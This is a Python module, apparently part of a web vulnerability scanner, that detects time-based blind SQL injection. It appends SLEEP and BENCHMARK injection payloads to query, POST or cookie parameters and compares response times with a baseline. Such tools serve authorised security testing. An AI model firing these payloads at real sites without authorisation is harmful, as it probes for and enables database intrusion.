import time
import urllib.parse
from ..utils import send_request

# Simple time-based SQL injection detection
PAYLOADS = [
    "' OR SLEEP(5)-- ",
    '" OR SLEEP(5)-- ',
    "' OR BENCHMARK(1000000,MD5(1))-- ",
    '" OR BENCHMARK(1000000,MD5(1))-- ',
]


def fetch(
    url: str,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
):
    """Fetch a URL using the given method and measure response time."""
    start = time.time()
    body = send_request(url, method=method, data=data, cookies=cookies)
    elapsed = time.time() - start
    return body, elapsed


def test_parameter(
    url: str,
    param: str,
    value: str,
    delay_threshold: float = 5.0,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    location: str = "query",
):
    """Attempt time-based SQL injection on a parameter."""
    data = data or {}
    cookies = cookies or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if location == "cookie":
        original = cookies.get(param, "")
        try:
            _, baseline_time = fetch(url, method=method, data=data if method.lower() == "post" else None, cookies=cookies)
        except Exception:
            baseline_time = 0.0
    elif method.lower() == "get":
        original = query.get(param, [""])[0]
        try:
            _, baseline_time = fetch(url, cookies=cookies)
        except Exception:
            baseline_time = 0.0
    else:
        original = data.get(param, "")
        try:
            _, baseline_time = fetch(url, method="post", data=data, cookies=cookies)
        except Exception:
            baseline_time = 0.0

    results = []
    for payload in PAYLOADS:
        if location == "cookie":
            new_cookies = cookies.copy()
            new_cookies[param] = original + payload
            new_url = url
            try:
                _, elapsed = fetch(
                    new_url,
                    method=method,
                    data=data if method.lower() == "post" else None,
                    cookies=new_cookies,
                )
            except Exception:
                elapsed = 0.0
        elif method.lower() == "get":
            query[param] = original + payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            try:
                _, elapsed = fetch(new_url, cookies=cookies)
            except Exception:
                elapsed = 0.0
        else:
            post_data = data.copy()
            post_data[param] = original + payload
            new_url = url
            try:
                _, elapsed = fetch(new_url, method="post", data=post_data, cookies=cookies)
            except Exception:
                elapsed = 0.0
        vulnerable = (elapsed - baseline_time) > delay_threshold
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'vulnerable': vulnerable,
        })
    return results
